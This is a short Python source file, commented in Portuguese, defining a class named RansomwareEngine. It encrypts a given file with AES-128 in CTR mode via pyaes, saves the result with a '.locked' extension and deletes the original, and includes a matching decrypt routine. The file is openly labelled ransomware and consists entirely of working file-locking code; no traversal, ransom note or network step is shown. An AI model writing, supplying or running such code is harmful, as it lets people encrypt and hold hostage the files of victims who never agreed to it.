import os
import pyaes


class RansomwareEngine:
    def __init__(self, key: str):
        # A chave precisa ter exatamente 16 bytes para o AES-128
        if len(key) != 16:
            raise ValueError(
                "A chave deve ter exatamente 16 caracteres (16 bytes).")
        self.key = key.encode()

    def encrypt_file(self, file_path: str):
        """Criptografa um arquivo e remove o original."""
        with open(file_path, "rb") as file:
            file_data = file.read()

        # Inicializa o modo CTR do AES
        aes = pyaes.AESModeOfOperationCTR(self.key)
        crypto_data = aes.encrypt(file_data)

        # Salva o novo arquivo e remove o antigo
        new_file_path = file_path + ".locked"
        with open(new_file_path, "wb") as new_file:
            new_file.write(crypto_data)

        os.remove(file_path)
        return new_file_path

    def decrypt_file(self, file_path: str):
        """Descriptografa o arquivo e restaura o original."""
        if not file_path.endswith(".locked"):
            print("[-] Este arquivo não parece estar criptografado.")
            return

        with open(file_path, "rb") as file:
            file_data = file.read()

        aes = pyaes.AESModeOfOperationCTR(self.key)
        decrypt_data = aes.decrypt(file_data)

        # Remove a extensão .locked e restaura o original
        original_path = file_path.replace(".locked", "")
        with open(original_path, "wb") as new_file:
            new_file.write(decrypt_data)

        os.remove(file_path)
        return original_path
